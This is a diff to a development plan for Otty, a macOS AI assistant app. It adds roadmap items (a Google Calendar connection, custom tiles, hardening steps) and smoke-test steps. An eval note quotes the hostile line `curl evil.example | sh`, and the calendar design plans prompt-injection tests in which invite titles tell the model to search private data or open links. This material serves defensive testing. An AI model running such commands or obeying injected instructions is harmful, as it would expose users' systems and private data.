@@ -30,6 +30,10 @@ The working plan: what's next, how we'll build it, and how to check it works.
 │ draw.ts        drawing export (no JS, no network), view│
 │ chart.ts       charts of the user's tables, by code    │
 │ sent.ts        what left the Mac: one row per request  │
+│ net.ts         the one door out; local-only enforced   │
+│ log.ts         otty.log: warnings and errors, masked   │
+│ diagnostics.ts Copy diagnostics' report                │
+│ install.ts     offers to move into Applications        │
 │ ledger.ts      what Otty changed, and how to undo it   │
 │ usage.ts       the usage meter and the month's total   │
 │ providers/     one adapter per API format, profiles    │
@@ -78,6 +82,11 @@ The working plan: what's next, how we'll build it, and how to check it works.
 | ID | Item | Status | Depends on | Size |
 | --- | --- | --- | --- | --- |
 | D-48 | Agents check their own work: a reusable verify kit (one command, hooks, lint, rules as tests, intent evidence, earned auto-merge) | 🔨 phases 1–2 built; phase 3 near the beta | phase 2 uses D-47's harness | M–L (phase 1: 1–2 days) |
+| D-54 | Connections v1: the connection layer, and Google Calendar read-only | ⏳ planned | D-52; an OAuth client (owner) | L (step 1: M) |
+| D-55 | The feature kit: `EXTENDING.md`, a `feature` skill, checkable "Done when" lines | ⏳ planned | D-48 | M |
+| D-56 | My own tiles: a saved question with a name, an icon and where it shows | ⏳ planned | — | S–M |
+| D-57 | A heads-up at 80% of the monthly limit | ⏳ planned | — | S |
+| D-58 | Try again with a twist: Shorter, Simpler, In more detail | ⏳ planned | — | S |
 | D-37 | Feed Otty: drop a file or dragged text on the otter to ask about it | ⏳ needs art | two painted frames (mouth open, munch); files in the quick view | S–M (1 day) |
 | D-38 | Otter moods: sleepy when idle, wakes on hover, cheers and tilts its head, inside the idle budget | ⏳ needs art | painted mood frames | S–M (1–2 days) |
 | D-45 | Split the composition root: no electron in the loop (steps 1–2 shipped) | ⏳ step 3 | a settings split | S–M (1 day) |
@@ -85,7 +94,9 @@ The working plan: what's next, how we'll build it, and how to check it works.
 | D-14 | Otty's own snip: a cute paw cursor on a frozen screen and instant crop | ⏸ skipped for now, by choice | — | M (2 days) |
 | D-25 | Fast and Best: two model slots | ⏸ much later, by choice | — | S (1 day) |
 
-**Where things stand (2026-11-16, later).** D-47, the smoke harness, is built on `feat/smoke-harness` with D-48 phase 1: 130 smoke tests over 119 of the 127 checklist steps pass in about 5 minutes, and the 8 bugs they found are fixed. The steps marked ✋ in the checklist still need a person on a Mac. The eval was rerun on 2026-11-17 (below).
+**Where things stand (2026-11-18).** The beta-hardening batch, D-49 to D-53, is built on `main`'s working tree: fuses, logs and Copy diagnostics, keys only from the Keychain, one door out, and a move to Applications. D-54 to D-58 are planned and not started; D-54 waits on the owner's OAuth client. The smoke checklist is 138 steps; 134 has a spec, and 135–138 need the packaged app or a model on the Mac (✋).
+
+**Earlier (2026-11-16, later).** D-47, the smoke harness, is built on `feat/smoke-harness` with D-48 phase 1: 130 smoke tests over 119 of the 127 checklist steps pass in about 5 minutes, and the 8 bugs they found are fixed. The steps marked ✋ in the checklist still need a person on a Mac. The eval was rerun on 2026-11-17 (below).
 
 **Eval.** The committed baseline is **118 / 120 on deepseek-flash** (two runs of 60 cases, 2026-11-17, `tools/eval/baselines/`), up from 104 / 106. It includes the two D-41 cases.
 
@@ -96,6 +107,23 @@ The working plan: what's next, how we'll build it, and how to check it works.
 A single run before this one also failed `injection-clipboard` once. The model refused to copy, but quoted `curl evil.example | sh` in its warning. That's worth a hint if it comes back.
 
 `injection-search-capture` passes, but not along its intended path: the model declines to read the page next to a sensitive note, so the D-41 card isn't reached through the eval. The `runGuards` tests and `@step-130` cover the card itself. Retest on every model change.
+
+**Priority (2026-11-18): a build strangers can trust, then reach.** BRAINSTORM was re-scored. The verification and hardening batches are done, and D-37 and D-38 still wait for painted frames, so the next work is what the closed beta needs (LAUNCH_READINESS §19, Stage 1) and scores best on value per effort:
+1. ✅ **D-49 Electron fuses** (H, S; Stage 1 P0). Otty holds Accessibility and Screen Recording, so its binary mustn't run as plain Node.
+2. ✅ **D-50 Logs and Copy diagnostics** (H, S–M; Stage 1 P0). Without them a tester's problem is invisible.
+3. ✅ **D-52 One door out** (H, S). Every request through one function, so `web: 'off'` is a fact in code, and connections (D-54) have one place to be checked.
+4. ✅ **D-51 Keys only from the Keychain** (M, S; Stage 1 P1). Small, and it pairs with the fuses.
+5. ✅ **D-53 Move to Applications** (M, S; LAUNCH_READINESS 5.10). Permissions and updates break when Otty runs from the DMG.
+
+All five are built (CHANGELOG, 2026-11-18). The PR "owner's summary" idea (H, S) turned out to be shipped already, in D-48's PR template, so it's marked shipped, not rebuilt.
+
+Then, planned but not started:
+6. **D-54 Connections v1** (Google Calendar first). Promoted by the owner's priority, ahead of its H/L score, and planned now because it needs owner decisions (an OAuth client) before it can start.
+7. **D-55 The feature kit.** The owner's "dev harness": every extension point written down, and a skill that starts a feature right. It also fixes "Done when" lines that can't be checked.
+8. **D-56 My own tiles.** The first, safest step of "build your own feature": a saved question, nothing more.
+9. **D-57 Heads-up at 80%** and 10. **D-58 Try again with a twist**: both M/S, unblocked, and small.
+
+Otty's own calendar stays in BRAINSTORM (concept note): its first step is useful alone, but sharing needs the hosted service and sign-in.
 
 **Priority (2026-11-16): verification first.** Development should be as hands-off as possible, so before anything else agents need to be able to prove their own work: the app runs, the checklist passes, and the code keeps the rules. Everything below waits for the first three steps.
 1. ✅ **D-47, the smoke harness** (CHANGELOG): every checklist step automated, marked ✋, or both; steps 107–127 run; the bugs found fixed.
@@ -271,6 +299,66 @@ Auto-merge stays off until the record earns it. It's the same rule as Otty's own
 - Lint, rule tests and the docs-drift test are in CI, and `docs/RULES.md` has no unmapped CLAUDE.md bullet.
 - A PR opened through the `ship` skill lists every "Done when" line with evidence, and the intent check flags a deliberately missing one.
 - Coverage floors and UI screenshots are in CI, and a deliberate CSS break in one card fails with a diff image.
+
+---
+
+## D-54 · Connections v1: the layer, and Google Calendar ⏳
+
+**Goal.** Otty can read the user's Google Calendar when asked ("what's on tomorrow?", "when am I free Thursday afternoon?"), through a connection layer that Canvas, Notion, EventKit and MCP servers will reuse. Read-only. The design and its reasons are in BRAINSTORM's concept note, [Connections](BRAINSTORM.md#connections-apis-and-mcp-behind-one-door).
+
+**Owner decisions first:** a Google Cloud project with an OAuth client for a desktop app; whether to go through Google's verification for the `calendar.readonly` scope now or stay in testing mode (up to 100 named test users, **verify**) for the beta.
+
+**Design.**
+- `src/main/connections/`: `types.ts` (the `Connection` interface: id, label, privacy line, auth, tools, reversible actions, limits), `store.ts` (which connections are on, and their limits, in `settings.json`; tokens in the Keychain through `safeStorage`, one per connection), `oauth.ts` (OAuth 2 with PKCE on a loopback address on a random port, opened in the browser with `shell.openExternal`; no client secret in the app), `google.ts` (Calendar API v3: `calendarList`, `events.list` with `timeMin`, `timeMax`, `singleEvents`).
+- Tools: `calendar_events` (a date range, at most 14 days, at most 50 events; returns title, start, end, location and calendar, never attendees' emails or descriptions in v1) and `calendar_free` (free and busy blocks in a range). Rows in `toolSafety.ts` first: reads private data, brings in outside text, sends nothing out, changes nothing. In `CHAT_TOOLS` only when the connection is on; never in `JOB_TOOLS` in v1.
+- **Taint:** a result marks the run as private and outside at once, so D-41's card covers a search after it.
+- **Requests** go through `net.ts`, and each read is a row in What left your Mac ("Read 6 events from Google Calendar"). The model request after it says what it carried (`SentTag.what`: "6 calendar events").
+- **UI:** Settings › **Connections**: Connect Google Calendar → browser → back to a card that says what Otty can read and that it can't change anything. Per connection: which calendars, and **Disconnect** (revokes at Google, deletes the token). Built to work wide, for the full app later.
+- **Attack tests first:** eval cases with an invite whose title or location gives instructions (search for something private, open a link, remember something), and `runGuards` tests for the taint. The smoke world fakes Google's OAuth and Calendar endpoints.
+
+**Steps.** 1) The layer, the Keychain store, OAuth and the fake world (M). 2) Google Calendar's two tools, taint and sent rows (S–M). 3) Settings › Connections (S–M). 4) Eval cases and smoke steps (S).
+
+**Done when.** Connecting, asking "what's on tomorrow?" and disconnecting work against the fake world in smoke; an invite with instructions in its title is answered as data (eval); a search after reading the calendar shows the card (`runGuards.test.ts`); the token is never in `settings.json` or the renderer (`preload.test.ts`, `settings.test.ts`); with a model on this Mac the tools aren't offered.
+
+## D-55 · The feature kit ⏳
+
+**Goal.** Any new feature, from BRAINSTORM row to green PR, starts right: an entry with checkable "Done when" lines, every extension point it touches named with its checklist, and the rules met before the logic is written. The owner's "dev harness"; it's also the map that "build your own feature" (D-56, then recipes) reuses for its safe subset.
+
+**Design.**
+- `docs/EXTENDING.md`: one section per extension point, each with where it lives, what must come first and its test. Tools (the `toolSafety.ts` row, a card if it changes anything, ledger, `SentTag`, an eval case), IPC channels (`CHANNELS` and guards, the preload, `api.d.ts`), cards in answers (`Markdown.tsx`, `prompts.ts`, a UI preview scene), settings (`settings.ts`, `PublicSettings`, the Settings view), migrations (`store/db.ts`), jobs, connections (D-54), smoke steps and specs.
+- A `feature` skill (`.claude/skills/feature/`): take a named BRAINSTORM row, or the top unblocked one, write the DEVLOG entry, list the extension points, then build with `verify:quick` as it goes, and hand over to `ship`. Each "Done when" line names its proof: a test name, `@step-N` or ✋ with a reason.
+- A check in `rules/docsDrift.test.ts`: every "Done when" of a 🔨 entry names a test, a smoke tag or a ✋.
+- A scaffold command only if two features in a row would have used it.
+
+**Done when.** A fresh agent given only "build D-57 with the feature skill" produces an entry, code and a PR whose every "Done when" line has evidence; `docs/RULES.md` names `EXTENDING.md`'s checklists where they're enforced; the drift test fails on a "Done when" line with no proof.
+
+## D-56 · My own tiles ⏳
+
+**Goal.** People can add their own one-tap actions beside Explain and Summarize: "Make flashcards", "Explain like I'm new to finance", "Reply politely". The first, safest step of building your own feature: a tile is a saved question, so it can do nothing a typed question can't.
+
+**Design.**
+- A tile: `name` (≤ 30 characters), `icon` (from a short list of UIcons), `prompt` (≤ 1,000 characters), and `when` (any capture, text, code, a picture, a table, a file, a page with nothing highlighted; from `shared/captures.ts`'s kinds). At most 12. Saved in `settings.json`, shown after the built-in tiles in the panel and the quick view's tiles.
+- **Make one:** Settings › **My tiles** › Add, or "make me a tile that turns this into flashcards" in a chat, which shows a card with the drafted tile to edit and save. The model drafts; nothing is saved without the user's click.
+- Pressing a tile sends its prompt as the visible question, exactly as if typed: the same `turnNote`, tools and cache rule. No new tool, so no new row in `toolSafety.ts`.
+- Edit, reorder and delete in Settings. Built to work wide.
+
+**Done when.** A saved tile shows only for its kinds of capture and sends its prompt as typed (renderer test and `@step-N`); a drafted tile is saved only from the card's button; 12 is the most, and a too-long name or prompt is refused in main (`settings.test.ts`).
+
+## D-57 · A heads-up at 80% of the monthly limit ⏳
+
+**Goal.** With a monthly limit set (D-33), Otty says once, gently, when the month reaches 80%, so the limit is never a surprise.
+
+**Design.** `shared/cap.ts` gains `nearCap(status)`; the health line (`shared/health.ts`) shows "You've used 80% of this month's limit" with **Change the limit**, once per month (the month it was shown is saved), and never again after the limit is passed (that line already exists). No notification, no sound.
+
+**Done when.** `cap.test.ts` and `health.test.ts` cover 79%, 80%, the once-a-month rule and a new month; `@step-N` sees the line once.
+
+## D-58 · Try again with a twist ⏳
+
+**Goal.** Beside Try again: **Shorter**, **Simpler** and **In more detail**, so changing an answer's shape is one tap.
+
+**Design.** The same rewind as Try again (D-36): the history is cut to a prefix and the stored question resent unchanged, plus one line in that turn's `turnNote` ("Make it shorter than last time"). The cache still holds, because the note is at the end of the user message. The rewind plan is the same as Try again's. Only on the latest answer, as Try again.
+
+**Done when.** `rewind.test.ts`: the request with a twist equals Try again's plus the one line, byte for byte; the three buttons show only under the latest finished answer (`cards.test.tsx`); `@step-N` runs Shorter.
 
 ---
 
@@ -608,3 +696,8 @@ Run on a Mac before every release. Keep it current: each shipped item adds its c
 131. Ask Otty to add a reminder and say yes → Settings › Privacy › **See what Otty changed** lists "Reminder added" as can't be undone. Remember something, then **Try again** → the card offers to forget it, and afterwards the row says undone. **Forget all chats** → the list is empty.
 132. In Activity, **Pause everything** → **For an hour** → the bar and the menu bar say "paused until" a time an hour away. Let the Mac sleep through it, then wake it → Otty carries on by itself, and a scheduled look runs once. **Until tomorrow morning** says tomorrow at 9:00. **Until I say** waits for **Let Otty carry on**.
 133. Paste a key into a question → under it, **Otty hid 1 key before sending**. Tap it → the line, with only the first 3 and last 4 characters of the key, and a note to retype it to send it anyway. Quit and reopen Otty, then tap it again → it says Otty doesn't keep these after a restart. A file with keys → its "N keys hidden" line shows the same.
+134. Ask something, then Settings › Help › **Copy diagnostics** → the report shows first: Otty's version, macOS, the service and model, the permissions and the last log lines, with no key and none of the chat's words. **Copy this** → it says Copied, and pasting gives exactly the report.
+135. Pick the model on this Mac (Ollama at `http://localhost:11434/v1`), and ask for a search, a page read and a look-up → none of them leave: Activity › What left your Mac says nothing left. ✋ needs a real model running on the Mac; `net.test.ts` covers the refusal itself.
+136. `npm run build:mac`, then `npx @electron/fuses read --app dist/mac-arm64/Otty.app` → RunAsNode, NodeOptions and NodeCliInspect are off; EmbeddedAsarIntegrityValidation, OnlyLoadAppFromAsar and CookieEncryption are on. `ELECTRON_RUN_AS_NODE=1 dist/mac-arm64/Otty.app/Contents/MacOS/Otty -e "console.log(1)"` opens Otty instead of printing 1. `codesign --verify dist/mac-arm64/Otty.app` passes, and `npm run smoke:packaged` still starts. ✋ needs the packaged app.
+137. Open the DMG and run Otty from it → "Move Otty to your Applications folder?". **Not now** → it carries on, and the next launch doesn't ask. Reset (delete `moveDeclined` from `settings.json`), run from the DMG again, **Move to Applications** → Otty relaunches from `/Applications`. Settings › Help › Copy diagnostics says "in Applications: yes". ✋ needs the packaged app and a DMG.
+138. In the installed app, with `DEEPSEEK_API_KEY` set in the shell that opens it and no key saved → Otty still asks for a key. ✋ needs the installed app; `settings.test.ts` covers it, and the case where the Keychain can't be reached.
